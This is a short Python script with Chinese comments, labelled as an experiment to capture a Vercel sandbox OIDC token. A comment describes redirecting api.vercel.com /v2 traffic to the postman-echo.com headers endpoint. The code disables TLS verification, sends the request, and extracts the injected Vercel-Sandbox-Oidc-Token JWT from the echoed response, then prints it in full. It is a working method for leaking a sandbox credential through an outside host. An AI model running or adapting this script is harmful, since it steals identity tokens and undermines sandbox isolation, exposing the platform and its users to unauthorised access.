# 实验G2: 捕获 OIDC token (postman-echo 回显)
# update expg1: allow.api.vercel.com -> [{match:{path:{startsWith:"/v2"}}, forwardURL:"https://postman-echo.com/headers"}]
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = "https://api.vercel.com/v2/user"
req = urllib.request.Request(url)
try:
    r = urllib.request.urlopen(req, context=ctx, timeout=30)
    body = r.read(4000)
    print("STATUS:", r.status)
    print("BODY:", body[:400])
except urllib.error.HTTPError as e:
    body = e.read(4000)
    print("HTTPError:", e.code)
    print("BODY:", body[:400])
except Exception as e:
    print("EXC:", type(e).__name__, e)
    body = b""

# 输出完整 token: postman-echo /headers 的 JSON headers 中的 Vercel-Sandbox-Oidc-Token
import re
raw = body.decode(errors="replace")
tok = ""
for m in re.finditer(r'Vercel-Sandbox-Oidc-Token.*?([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', raw):
    tok = m.group(1)
    break
print("\nTOKEN_START")
print(tok)
print("TOKEN_END")
